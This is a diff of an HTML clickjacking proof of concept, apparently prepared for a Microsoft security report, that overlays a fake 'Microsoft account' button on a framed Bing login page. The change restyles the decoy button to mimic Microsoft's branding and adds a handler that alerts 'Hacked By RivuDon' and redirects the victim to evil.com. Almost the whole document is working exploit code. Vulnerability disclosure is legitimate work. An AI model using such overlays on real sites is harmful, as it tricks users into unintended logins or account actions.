@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MSRC POC</title>
+<title>SSO MSRC POC</title>
 <style>
     iframe {
         position: absolute;
@@ -11,42 +11,71 @@
         left: 0;
         width: 100%;
         height: 100%;
-        opacity: 0.9; /* Makes the iframe invisible */
+        opacity: 0.9;
         z-index: 99;
     }
 
-    button {
+    .microsoft-btn {
         z-index: 200;
-        top:375px;
-	left: 905px;
+        top: 382px;
+        left: 848px;
         position: relative;
-	background-color:#007bff;
 
-    padding: 10px 75px;      /* Increase space inside the button */
-    font-size: 20px;         /* Make the text larger */
-    border-radius: 0px;      /* Optional: make it look nicer */
-    cursor: pointer;         /* Optional: show pointer on hover */
-color:white;
+        display: inline-flex;
+        align-items: center;
+        gap: 14px;
+
+        background-color: #106EBE; /* Microsoft blue */
+        color: #ffffff;
+
+        padding: 8px 68px;
+        border-radius: 4px;
+        border: none;
+
+        font-family: "Segoe UI", SegoeUI, Arial, sans-serif;
+        font-size: 18px;
+        font-weight: 600;
+
+        cursor: pointer;
     }
-    h1 {
-        top: 300px;
-        position: relative;
 
+    .microsoft-logo {
+        width: 26px;
+        height: 26px;
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 2px;
+    }
+
+    .microsoft-logo span {
+        background-color: #ffffff;
     }
 </style>
 </head>
 <body>
-<button onclick="alert('Surprise Hacked! - Rivek')">Microsoft Account</button>
 
-<!-- Invisible iframe targeting the account deletion URL -->
-<iframe id="target-frame" src="https://www.bingplaces.com/Authentication/Index" frameborder="0"></iframe>
+<button class="microsoft-btn" onclick="handleClick()">
+    <div class="microsoft-logo">
+        <span></span><span></span>
+        <span></span><span></span>
+    </div>
+    Microsoft account
+</button>
+
+<!-- Invisible iframe targeting the authentication URL -->
+<iframe id="target-frame" src="https://www.bing.com/forbusiness/genericLogin" frameborder="0"></iframe>
 
 <script>
-    
+
+function handleClick()
+{
+	alert("Hacked By RivuDon");
+	window.location.href = "https://evil.com";
+}
     document.getElementById('target-frame').onload = function() {
-        
         console.log('Iframe has loaded, ready for clickjacking.');
     };
 </script>
+
 </body>
 </html>
